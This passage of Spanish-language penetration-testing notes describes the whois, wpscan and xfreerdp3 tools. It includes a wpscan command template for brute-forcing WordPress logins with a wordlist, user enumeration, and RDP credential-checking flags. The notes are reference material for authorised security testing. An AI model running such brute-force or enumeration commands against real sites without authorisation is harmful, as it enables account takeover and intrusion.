- Ejemplo: `whatis ls` devuelve “ls (1) - list directory contents”.  

### `whois`  
Herramienta que consulta la base de datos de registros de dominios.  
- Obtiene información sobre el **propietario** de un dominio.  
- Muestra **fechas de creación y expiración**.  
- Indica servidores DNS asociados y hosting.  
- Puede revelar datos de contacto (si no están ocultos con privacidad).  
- También sirve para investigar **rangos de IP** y ASN.  

### `wpscan`  
Herramienta especializada para **auditorías de seguridad en sitios WordPress**.  
- Detecta versión del core, **enumera temas y plugins** y comprueba si existen vulnerabilidades conocidas consultando la WPScan Vulnerability Database.  
- Soporta **enumeración de usuarios**, fingerprinting, fuerza bruta contra el formulario de login y exportación de reportes.  
- Para obtener la información de vulnerabilidades necesita un **API token** (registro en wpscan.com); sin token el escaneo funciona pero no mostrará detalles CVE/DB.
- Soporta comprobaciones de login por fuerza bruta con wordlists; **usar solo contra objetivos autorizados**.  
- Ejemplo de comandos: `wpscan --url <url> --usernames <user> --passwords <WORDLIST>`, `wpscan --url <url> -e u`

### `xfreerdp3`  
Cliente RDP (Remote Desktop Protocol) de la suite **FreeRDP** (binario `xfreerdp` v3.x).  
- Conecta a escritorios/servidores Windows vía **RDP** (puerto por defecto 3389).  
- Soporta **autenticación** (usuario/contraseña, dominio, NLA) y modos de seguridad (`/sec:nla|tls|rdp`).  
- Permite **redirigir recursos locales**: unidades (`/drive:NAME,PATH`), portapapeles (`/clipboard`), impresoras, sonido y micrófono. 
- Utilidad en pentesting autorizado: comprobar credenciales (`/auth-only`), probar redirecciones y verificar configuración de certificados (`/cert-ignore`, `/cert-tofu`).  
- Parámetros útiles: `/v:<host[:port]>`, `/u:`, `/p:`, `/d:`, `/log-level:TRACE|DEBUG|INFO|WARN|ERROR`.

